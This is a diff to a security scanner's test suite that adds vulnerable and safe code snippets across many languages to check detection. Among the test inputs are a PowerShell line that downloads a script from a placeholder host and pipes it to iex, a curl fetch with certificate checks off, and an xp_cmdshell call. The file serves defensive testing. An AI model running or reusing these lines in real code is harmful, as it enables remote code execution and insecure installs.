@@ -2502,7 +2502,9 @@ bad('sbd_eval_reflection', 'js', 'const res = eval(req.body.code);', 'eval');
 (function templateRoster() {
   const dir = path.join(DIR, 'templates');
   const LANGS = ['c', 'csharp', 'go', 'java', 'javascript', 'kotlin', 'php',
-                 'python', 'ruby', 'rust', 'shell', 'swift', 'typescript'];
+                 'python', 'ruby', 'rust', 'shell', 'swift', 'typescript',
+                 'cpp', 'powershell', 'sql', 'scala', 'dart', 'groovy', 'cobol',
+                 'vbnet', 'abap', 'apex', 'objc', 'perl', 'lua', 'elixir', 'solidity', 'r'];
 
   uniq('template-roster');
   const absent = LANGS.filter(l => !fs.existsSync(path.join(dir, `${l}.md`)));
@@ -3324,6 +3326,220 @@ good('ux_queryselector', 'js', 'document.querySelector(req.query.sel);');
       && bundle.includes('<script id="sc-snapshot" type="application/json"></script>') && pkgFiles.includes('reports/dashboard.html')) pass++;
   else { fail++; console.log('MISS  dashboard-bundle-self-contained'); }
   try { fs.rmSync(d, { recursive: true, force: true }); } catch { /* ignore */ }
+})();
+
+// --- every pattern id has a test (2026-11 review: 19 had none) ---
+bad('cov_autocomplete', 'html', '<input type="password" name="pw" autocomplete="on">', 'autocomplete-on');
+good('cov_autocomplete_ok', 'html', '<input type="password" name="pw" autocomplete="new-password">');
+bad('cov_upload_exec', 'conf', 'location /uploads { fastcgi_pass php; }', 'upload-exec');
+bad('cov_api2', 'js', 'app.get("/admin/users", function (req, res) { res.json(users); });', 'API-2');
+bad('cov_api4', 'js', 'const all = await prisma.user.findMany();', 'API-4');
+bad('cov_api5', 'js', 'router.delete("/users/:id", handler);', 'API-5');
+good('cov_api5_ok', 'js', 'router.delete("/users/:id", requireAuth, handler);');
+bad('cov_api6', 'js', 'app.use(express.json());', 'API-6');
+good('cov_api6_ok', 'js', 'app.use(express.json({ limit: "100kb" }));');
+bad('cov_api7', 'js', 'const rows = await repo.find({ pagination: false });', 'API-7');
+bad('cov_api10', 'py', 'data = requests.get(url, timeout=5).json()', 'API-10');
+bad('cov_c4', 'yaml', 'securityContext:\n  readOnlyRootFilesystem: false\n', 'C-4');
+good('cov_c4_ok', 'yaml', 'securityContext:\n  readOnlyRootFilesystem: true\n');
+bad('cov_c9', 'yaml', 'spec:\n  automountServiceAccountToken: true\n', 'C-9');
+bad('cov_k8s_np', 'yaml', 'networkPolicy: {}\n', 'k8s-np');
+good('cov_k8s_np_ok', 'yaml', 'apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: deny-all\n');
+bad('cov_k8s_psa', 'yaml', 'metadata:\n  labels:\n    pod-security.kubernetes.io/enforce: privileged\n', 'k8s-psa');
+bad('cov_k8s_seccomp', 'yaml', 'securityContext:\n  seccompProfile: {}\n', 'k8s-seccomp');
+bad('cov_logging_off', 'py', 'logging.disable(logging.CRITICAL)', 'logging-disabled');
+bad('cov_logging_level', 'js', 'const cfg = { logLevel: "silent" };', 'logging-disabled');
+bad('cov_auth_no_log', 'js', 'try { verify(t); } catch (e) { return res.status(401).end(); }', 'auth-no-log');
+good('cov_auth_no_log_ok', 'js', 'try { verify(t); } catch (e) { log.warn("bad token"); return res.status(401).end(); }');
+bad('cov_log_truncated', 'js', 'logger.info(event.message.slice(0, 20));', 'log-truncated');
+bad('cov_docker_digest', 'Dockerfile', 'FROM node:20-alpine\n', 'docker-digest');
+good('cov_docker_digest_ok', 'Dockerfile', 'FROM node:20-alpine@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n');
+bad('cov_npm_audit', 'yml', 'run: npm install --production\n', 'npm-audit');
+good('cov_npm_ignore_scripts_ok', 'yml', 'run: npm ci --ignore-scripts\n');
+bad('cov_temp_race', 'sh', 'f=$(mktemp -u)\n', 'temp-race');
+
+// --- the gaps found by the language x vulnerability matrix ---
+bad('gap_java_sqli_quotes', 'java', 'stmt.executeQuery("SELECT * FROM u WHERE n = \'" + name + "\'");', 'sql-concat');
+bad('gap_kt_sqli_template', 'kt', 'stmt.executeQuery("SELECT * FROM u WHERE n = \'$name\'")', 'sql-concat');
+bad('gap_go_sqli_quotes', 'go', 'db.Query("SELECT * FROM u WHERE n = \'" + name + "\'")', 'sql-concat');
+bad('gap_php_sqli_interp', 'php', '$db->query("SELECT * FROM u WHERE n = \'$name\'");', 'sql-concat');
+good('gap_php_sqli_bound', 'php', '$st = $db->prepare("SELECT * FROM u WHERE n = ?"); $st->execute([$name]);');
+bad('gap_cs_cmd', 'cs', 'Process.Start("cmd.exe", "/c ping " + host);', 'shell');
+bad('gap_c_system_var', 'c', 'system(cmd);', 'shell');
+good('gap_c_system_literal', 'c', 'execv("/usr/bin/ping", argv);');
+bad('gap_go_md5', 'go', 'h := md5.Sum(data)', 'weak-hash');
+bad('gap_js_des', 'js', 'crypto.createCipheriv("des-ede3-cbc", key, iv)', 'weak-crypto');
+bad('gap_rb_des', 'rb', 'OpenSSL::Cipher.new("des-ecb")', 'weak-crypto');
+bad('gap_c_ecb', 'c', 'EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);', 'weak-crypto');
+bad('gap_kt_tls', 'kt', 'conn.hostnameVerifier = HostnameVerifier { _, _ -> true }', 'tls-off');
+bad('gap_cs_tls', 'cs', 'handler.ServerCertificateCustomValidationCallback = (m, c, ch, e) => true;', 'tls-off');
+bad('gap_rs_tls', 'rs', 'let c = ClientBuilder::new().danger_accept_invalid_certs(true).build()?;', 'tls-off');
+bad('gap_swift_trust', 'swift', 'completionHandler(.useCredential, URLCredential(trust: challenge.protectionSpace.serverTrust!))', 'tls-off');
+bad('gap_sh_curl_k', 'sh', 'curl -k https://api.example.com/install', 'tls-off');
+bad('gap_rb_const_secret', 'rb', 'PASSWORD = "Sup3rS3cretPassw0rd"', 'secret');
+good('gap_secret_field_name', 'py', 'PASSWORD_FIELD = "password_confirmation"\nSECRET_NAME = "prod/db/credentials"\n');
+good('gap_secret_env_ref', 'sh', 'DB_PASSWORD="${DB_PASSWORD}"\n');
+bad('gap_cs_xxe', 'cs', 'var s = new XmlReaderSettings { DtdProcessing = DtdProcessing.Parse };', 'xxe');
+bad('gap_php_xxe', 'php', '$x = simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NOENT);', 'xxe');
+bad('gap_rb_xxe', 'rb', 'doc = Nokogiri::XML(xml) { |c| c.noent }', 'xxe');
+bad('gap_js_xxe', 'js', 'const doc = libxmljs.parseXml(xml, { noent: true });', 'xxe');
+bad('gap_cs_redirect', 'cs', 'return Redirect(Request.Query["next"]);', 'open-redirect');
+bad('gap_php_redirect', 'php', 'header("Location: " . $_GET["next"]);', 'open-redirect');
+bad('gap_java_path', 'java', 'File f = new File("/data/" + request.getParameter("f"));', 'path-traversal');
+bad('gap_cs_path', 'cs', 'var t = File.ReadAllText("/data/" + Request.Query["f"]);', 'path-traversal');
+bad('gap_py_log_concat', 'py', 'logger.info("login " + request.args["user"])', 'log-inject');
+
+// --- languages added 2026-11: each has bad cases that must fire and safe ones that must not ---
+// PowerShell
+bad('ps_iex', 'ps1', 'Invoke-Expression $userInput', 'eval');
+bad('ps_iex_pipe', 'ps1', 'iwr https://x.example/i.ps1 | iex', 'eval');
+bad('ps_secret', 'ps1', '$pw = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force', 'secret');
+bad('ps_tls', 'ps1', 'Invoke-RestMethod -Uri $u -SkipCertificateCheck', 'tls-off');
+bad('ps_sql', 'ps1', '$cmd.CommandText = "SELECT * FROM Users WHERE Name = \'$Name\'"', 'sql-concat');
+good('ps_safe', 'ps1', "& 'C:\\Tools\\convert.exe' '--in' $InputPath\n$cmd.CommandText = 'SELECT Id FROM Users WHERE Email = @email'\n");
+// SQL
+bad('sql_exec_var', 'sql', "SET @sql = 'SELECT * FROM u WHERE n = ''' + @name + ''''; EXEC(@sql);", 'sql-concat');
+bad('sql_exec_imm', 'sql', "EXECUTE IMMEDIATE 'SELECT * FROM u WHERE n = ''' || p_name || '''';", 'sql-concat');
+bad('sql_xp_cmdshell', 'sql', "EXEC xp_cmdshell 'dir';", 'shell');
+bad('sql_grant_public', 'sql', 'GRANT SELECT ON dbo.Customers TO PUBLIC;', 'sql-grant-public');
+bad('sql_login_pw', 'sql', "CREATE LOGIN app WITH PASSWORD = 'Prod#2024pass';", 'secret');
+bad('sql_check_policy', 'sql', 'ALTER LOGIN app WITH CHECK_POLICY = OFF;', 'sql-weak-login');
+good('sql_safe', 'sql', "EXEC sp_executesql N'SELECT Id FROM dbo.Users WHERE Email = @email', N'@email nvarchar(256)', @email = @Email;\nEXECUTE IMMEDIATE 'SELECT id FROM users WHERE email = :1' INTO v_id USING p_email;\n");
+// Scala
+bad('scala_splice', 'scala', 'sql"SELECT * FROM users WHERE name = #$name".as[User]', 'sql-concat');
+bad('scala_jdbc', 'scala', 'stmt.executeQuery("SELECT * FROM u WHERE id = " + id)', 'sql-concat');
+bad('scala_proc', 'scala', 's"convert $in $out".!!', 'shell');
+bad('scala_deser', 'scala', 'val o = new ObjectInputStream(in).readObject()', 'insecure-deserialization');
+good('scala_safe', 'scala', 'sql"SELECT id FROM users WHERE email = $email".as[Long]\nval out = Seq("convert", inPath, outPath).!!\n');
+// Dart
+bad('dart_tls', 'dart', 'client.badCertificateCallback = (cert, host, port) => true;', 'tls-off');
+bad('dart_prefs', 'dart', "await prefs.setString('authToken', token);", 'mobile-insecure-storage');
+bad('dart_sql', 'dart', "db.rawQuery(\"SELECT * FROM u WHERE n = '$name'\");", 'sql-concat');
+bad('dart_shell', 'dart', "Process.run('sh', ['-c', cmd]);", 'shell');
+good('dart_safe', 'dart', "final rows = await db.rawQuery('SELECT id FROM users WHERE email = ?', [email]);\nfinal r = await Process.run('convert', [inPath, outPath]);\n");
+// Groovy / Jenkins
+bad('jenkins_sh', 'groovy', 'sh "git checkout ${params.BRANCH}"', 'jenkins-sh-interpolation');
+bad('jenkinsfile_name', 'Jenkinsfile', 'pipeline { stages { stage("b") { steps { sh "deploy ${env.TARGET}" } } } }', 'jenkins-sh-interpolation');
+bad('groovy_eval', 'groovy', 'def r = Eval.me(input)', 'eval');
+bad('groovy_exec', 'groovy', 'def p = "git clone ${url}".execute()', 'shell');
+good('jenkins_safe', 'groovy', "withEnv([\"BRANCH=${params.BRANCH}\"]) {\n  sh 'git checkout \"$BRANCH\"'\n}\n");
+// COBOL
+bad('cobol_dyn_sql', 'cbl', '           EXEC SQL EXECUTE IMMEDIATE :WS-SQL END-EXEC.', 'sql-concat');
+bad('cobol_string_sql', 'cbl', "           STRING 'SELECT * FROM ACCT WHERE ID = ' WS-IN DELIMITED BY SIZE INTO WS-SQL.", 'sql-concat');
+bad('cobol_secret', 'cbl', "       01 WS-DB-PASSWORD   PIC X(16) VALUE 'Prod#Passw0rd1'.", 'secret');
+bad('cobol_dyn_call', 'cbl', '           CALL WS-PGM USING WS-AREA.', 'cobol-dynamic-call');
+bad('cobol_display_pan', 'cbl', '           DISPLAY WS-CARD-NUMBER.', 'log-leak');
+good('cobol_safe', 'cbl', "           EXEC SQL SELECT ACCT_NAME INTO :WS-NAME FROM ACCOUNTS WHERE ACCT_ID = :WS-ACCT-ID END-EXEC.\n           CALL 'ACCTUPD' USING WS-AREA.\n       01 WS-PASSWORD   PIC X(16) VALUE SPACES.\n");
+// VB.NET
+bad('vb_sql', 'vb', 'Dim cmd As New SqlCommand("SELECT * FROM u WHERE n = \'" & name & "\'", conn)', 'sql-concat');
+bad('vb_tls', 'vb', 'ServicePointManager.ServerCertificateValidationCallback = Function(s, c, ch, e) True', 'tls-off');
+bad('vb_deser', 'vb', 'Dim o = New BinaryFormatter().Deserialize(stream)', 'insecure-deserialization');
+good('vb_safe', 'vb', 'Using cmd As New SqlCommand("SELECT Id FROM Users WHERE Email = @email", conn)\n    cmd.Parameters.Add("@email", SqlDbType.NVarChar, 256).Value = email\nEnd Using\n');
+// ABAP
+bad('abap_dyn_where', 'abap', 'SELECT * FROM usr02 WHERE (lv_where) INTO TABLE lt_users.', 'sql-concat');
+bad('abap_system', 'abap', "CALL 'SYSTEM' ID 'COMMAND' FIELD lv_cmd.", 'shell');
+bad('abap_generate', 'abap', 'GENERATE SUBROUTINE POOL lt_source NAME lv_prog.', 'eval');
+bad('abap_client', 'abap', 'SELECT * FROM kna1 CLIENT SPECIFIED INTO TABLE lt_c.', 'abap-client-specified');
+good('abap_safe', 'abap', "SELECT carrid, connid FROM spfli\n  WHERE carrid = @lv_carrid\n  INTO TABLE @DATA(lt_flights).\n");
+// Apex
+bad('apex_soql', 'cls', "List<Account> a = Database.query('SELECT Id FROM Account WHERE Name = \\'' + name + '\\'');", 'sql-concat');
+bad('apex_without_sharing', 'cls', 'public without sharing class OrderController { }', 'apex-without-sharing');
+bad('apex_redirect', 'cls', "return new PageReference(ApexPages.currentPage().getParameters().get('retURL'));", 'open-redirect');
+bad('apex_md5', 'cls', "Blob h = Crypto.generateDigest('MD5', b);", 'weak-hash');
+good('apex_safe', 'cls', "public with sharing class OrderService {\n  List<Account> a = [SELECT Id FROM Account WHERE Name = :name WITH USER_MODE];\n}\n");
+// Objective-C
+bad('objc_nslog', 'm', 'NSLog(userInput);', 'format-string');
+bad('objc_defaults', 'm', '[[NSUserDefaults standardUserDefaults] setObject:token forKey:@"authToken"];', 'mobile-insecure-storage');
+bad('objc_md5', 'm', 'CC_MD5(data.bytes, (CC_LONG)data.length, digest);', 'weak-hash');
+bad('objc_tls', 'm', 'policy.allowInvalidCertificates = YES;', 'tls-off');
+good('objc_safe', 'm', 'NSLog(@"%@", userInput);\nCC_SHA256(data.bytes, (CC_LONG)data.length, digest);\n');
+// Perl
+bad('perl_system', 'pl', 'system("ping $host");', 'shell');
+bad('perl_backtick', 'pl', 'my $out = `ls $dir`;', 'shell');
+bad('perl_eval', 'pl', 'eval $input;', 'eval');
+bad('perl_dbi', 'pl', '$dbh->do("DELETE FROM users WHERE id = $id");', 'sql-concat');
+bad('perl_tls', 'pl', 'my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });', 'tls-off');
+good('perl_safe', 'pl', "system('convert', $in, $out) == 0 or die;\nmy $sth = $dbh->prepare('SELECT id FROM users WHERE email = ?');\n");
+// Lua
+bad('lua_exec', 'lua', 'os.execute("ping " .. host)', 'shell');
+bad('lua_load', 'lua', 'local f = loadstring(code)', 'eval');
+bad('lua_tls', 'lua', 'local res = httpc:request_uri(url, { ssl_verify = false })', 'tls-off');
+good('lua_safe', 'lua', 'local q = "SELECT id FROM users WHERE email = " .. ngx.quote_sql_str(email)\n');
+// Elixir
+bad('ex_atom', 'ex', 'role = String.to_atom(params["role"])', 'atom-exhaustion');
+bad('ex_eval', 'ex', 'Code.eval_string(input)', 'eval');
+bad('ex_fragment', 'ex', 'where(q, [u], fragment("name = \'#{name}\'"))', 'sql-concat');
+bad('ex_tls', 'exs', 'ssl: [verify: :verify_none]', 'tls-off');
+good('ex_safe', 'ex', 'from(u in User, where: u.email == ^email) |> Repo.one()\nrole = String.to_existing_atom(params["role"])\n');
+// Solidity
+bad('sol_tx_origin', 'sol', 'require(tx.origin == owner);', 'solidity-tx-origin');
+bad('sol_unchecked', 'sol', 'payable(to).call{value: amount}("");', 'solidity-unchecked-call');
+bad('sol_delegatecall', 'sol', 'target.delegatecall(data);', 'solidity-delegatecall');
+bad('sol_random', 'sol', 'uint r = uint(keccak256(abi.encode(block.timestamp, msg.sender))) % 100;', 'solidity-weak-randomness');
+bad('sol_pragma', 'sol', 'pragma solidity ^0.6.12;', 'solidity-old-compiler');
+good('sol_safe', 'sol', 'pragma solidity 0.8.28;\n(bool ok, ) = payable(to).call{value: amount}("");\nif (!ok) revert TransferFailed();\n');
+// R
+bad('r_system', 'r', 'system(paste("ping", host))', 'shell');
+bad('r_eval', 'r', 'eval(parse(text = input))', 'eval');
+bad('r_sql', 'r', 'dbGetQuery(con, paste0("SELECT * FROM u WHERE n = \'", name, "\'"))', 'sql-concat');
+bad('r_readrds', 'r', 'm <- readRDS(url(model_url))', 'insecure-deserialization');
+good('r_safe', 'r', 'DBI::dbGetQuery(con, "SELECT id FROM users WHERE email = ?", params = list(email))\nprocessx::run("convert", c(in_path, out_path))\n');
+// C++
+bad('cpp_system', 'cpp', 'std::system(cmd.c_str());', 'shell');
+bad('cpp_rand_token', 'cpp', 'auto token = std::to_string(std::rand());', 'weak-rng');
+good('cpp_safe', 'cpp', 'std::array<unsigned char, 32> token;\nrandombytes_buf(token.data(), token.size());\n');
+
+// --- comments, templates and false-positive regressions ---
+(function commentsAndTemplates() {
+  const { loadPatterns, matchContent } = require('./scan.js');
+  const pats = loadPatterns();
+  const ids = (code, ext) => matchContent(code, 'cm.' + ext, pats).map(h => h.id);
+  const T = (name, cond) => { uniq(name); if (cond) pass++; else { fail++; console.log(`MISS  ${name}`); } };
+
+  // A pattern named in a comment is not code; real code and secrets still count.
+  T('comment-not-flagged-js', !ids('// never: eval(userInput) or el.innerHTML = x\n', 'js').length);
+  T('comment-not-flagged-py', !ids('# never: os.system("rm " + x); hashlib.md5(x)\n', 'py').length);
+  T('comment-secret-still-flagged', ids('// password = "Hunter2Hunter2xyz"\n', 'js').includes('secret'));
+  T('code-before-comment-flagged', ids('eval(x); // fine\n', 'js').includes('eval'));
+  T('cobol-fixed-comment', !ids('      * never: CALL WS-PROG USING WS-DATA.\n', 'cbl').length);
+  T('cobol-code-flagged', ids('           CALL WS-PROG USING WS-DATA.\n', 'cbl').includes('cobol-dynamic-call'));
+  T('deprecated-comment-still-flagged', ids('/** @deprecated */\n', 'js').includes('API-9'));
+
+  // Safe code that used to be flagged.
+  T('py-log-args-ok', !ids('logging.info("login ok user=%s", user)\n', 'py').includes('log-inject'));
+  T('py-log-percent-flagged', ids('logging.info("login " % request.args["u"])\n', 'py').includes('log-inject'));
+  T('rb-system-args-ok', !ids('system("ls", "-l", dir)\n', 'rb').includes('shell'));
+  T('rb-system-string-flagged', ids('system("ls #{dir}")\n', 'rb').includes('shell'));
+  T('go-crypto-rand-ok', !ids('import "crypto/rand"\nfunc f(){ rand.Read(salt) }\n', 'go').includes('weak-rng'));
+  T('go-math-rand-flagged', ids('import "math/rand"\nfunc f(){ salt := rand.Int() }\n', 'go').includes('weak-rng'));
+  T('upload-dir-param-ok', !ids('fn f(data: &[u8], upload_dir: &Path) {}\n', 'rs').includes('file-upload'));
+  T('upload-dir-assign-flagged', ids('UPLOAD_FOLDER = "/var/www/uploads"\n', 'py').includes('file-upload'));
+  T('sql-xp-cmdshell-off-ok', !ids("EXEC sp_configure 'xp_cmdshell', 0;\n", 'sql').includes('shell'));
+  T('sql-xp-cmdshell-on-flagged', ids("EXEC xp_cmdshell @cmd\n", 'sql').includes('shell'));
+  T('groovy-gstring-ok', !ids('sql.rows("SELECT id FROM users WHERE email = ${email}")\n', 'groovy').includes('sql-concat'));
+  T('groovy-concat-flagged', ids('sql.rows("SELECT id FROM users WHERE email = " + email)\n', 'groovy').includes('sql-concat'));
+  T('yaml-schema-ok', !ids('const c = yaml.load(t, { schema: yaml.JSON_SCHEMA });\n', 'js').includes('insecure-deserialization'));
+  T('yaml-plain-flagged', ids('cfg = yaml.load(text)\n', 'py').includes('insecure-deserialization'));
+  T('rb-log-plain-error-ok', !ids('Rails.logger.error("failed: #{e}")\n', 'rb').includes('log-inject'));
+  T('rb-log-params-flagged', ids('Rails.logger.info("q=#{params[:q]}")\n', 'rb').includes('log-inject'));
+
+  // Every secure snippet in every template must scan clean, so a template can
+  // never teach what the scanner rejects. Lines starting a "never" example,
+  // and the few controls that only remind the reader to validate, are skipped.
+  const ext = { typescript: 'ts', javascript: 'js', python: 'py', go: 'go', rust: 'rs', java: 'java', kotlin: 'kt', swift: 'swift', csharp: 'cs', c: 'c', php: 'php', ruby: 'rb', shell: 'sh', cpp: 'cpp', powershell: 'ps1', sql: 'sql', scala: 'scala', dart: 'dart', groovy: 'groovy', cobol: 'cbl', vbnet: 'vb', abap: 'abap', apex: 'cls', objc: 'm', perl: 'pl', lua: 'lua', elixir: 'ex', solidity: 'sol', r: 'r' };
+  const REMINDERS = new Set(['file-upload']); // fires on any upload handler, by design
+  const bad2 = [];
+  for (const [lang, e] of Object.entries(ext)) {
+    const md = fs.readFileSync(path.join(DIR, 'templates', `${lang}.md`), 'utf8');
+    const code = (md.match(/```[\w+-]*\n[\s\S]*?```/g) || [])
+      .map(b => b.replace(/^```[\w+-]*\n/, '').replace(/```$/, ''))
+      .join('\n').split('\n').filter(l => !/\bnever\b/i.test(l)).join('\n');
+    const hits = matchContent(code, `tpl.${e}`, pats).filter(h => !REMINDERS.has(h.id));
+    if (hits.length) bad2.push(`${lang}:${[...new Set(hits.map(h => h.id))].join('/')}`);
+  }
+  uniq('templates-scan-clean');
+  if (bad2.length === 0) pass++;
+  else { fail++; console.log(`MISS  templates-scan-clean: ${bad2.join(' ')}`); }
 })();
 
 // --- fix.js --apply autofix engine ---
